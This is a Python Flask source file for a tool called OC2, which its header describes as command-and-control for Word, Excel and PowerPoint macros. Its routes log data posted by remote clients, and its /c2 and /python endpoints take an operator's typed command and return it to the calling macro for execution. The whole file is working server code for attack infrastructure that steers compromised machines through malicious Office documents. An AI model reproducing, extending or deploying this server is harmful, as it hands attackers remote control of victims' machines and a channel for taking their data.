# OC2 (Office Command and Control) allows you to send remote commands and receive encrypted data with a Word/Excel/PowerPoint Macro.
# Created by https://github.com/Splintaz/
import colorama
import json
from flask import Blueprint, request, Response
from colorama import Fore, Back, Style
from flask.json import jsonify
from flask.templating import render_template

views = Blueprint("views", __name__)

@views.route("/", methods=["POST"])
def home():
    print(Fore.RED + f"{request.remote_addr}: " + str(request.data))
    print(Style.RESET_ALL)
    return "Data recieved!"

@views.route("/enc", methods=["POST"])
def encrypt():
    print(Fore.RED + f"{request.remote_addr}: " + str(request.data))
    print(Style.RESET_ALL)
    return "Data recieved!"

@views.route("/c2", methods=["POST"])
def c2():
    print(Fore.RED + f"{request.remote_addr}: " + str(request.data))
    print(Style.RESET_ALL)
    dictToSend = input(Fore.CYAN + "> ")
    return dictToSend

@views.route("/python", methods=["POST"])
def python():
    input_json = request.get_json(force=True) 
    print(Fore.RED + f"{request.remote_addr}: " + str(input_json))
    print(Style.RESET_ALL)
    dictToReturn = input(Fore.CYAN + "> ")
    return jsonify(dictToReturn)
